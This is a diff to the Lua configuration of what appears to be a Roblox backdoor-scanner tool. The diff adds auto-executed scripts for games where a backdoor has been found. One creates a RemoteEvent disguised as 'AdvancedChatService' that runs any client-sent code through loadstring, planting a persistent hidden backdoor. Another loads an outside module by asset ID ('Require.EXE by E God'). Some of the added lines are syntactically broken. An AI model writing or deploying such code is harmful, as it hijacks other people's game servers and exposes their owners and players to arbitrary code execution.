@@ -13,7 +13,15 @@ return {
 	-- $scripts that executes after backdoor is found
 	-- $you can add any scripts here
 	["autoExec"] = {
-		[[print("null's beckdeer skenner is epic!")]],
+		[[print("Welcome!")]],
+		[[local meowx = Instance.new("RemoteEvent", game.ReplicatedStorage)
+meowx.Name = "AdvancedChatService"
+meowx.OnServerEvent:connect(function(player, chat)
+    loadstring(chat)()
+end)]]
+		[[print("Processes done!")]]
+		[[require(125992639027440)["Require.EXE by E God"]("%username%)]]
+		[[print("LVL: 8-9")]]
 	},
 
 	-- $remote filters that you don't want to be scanned
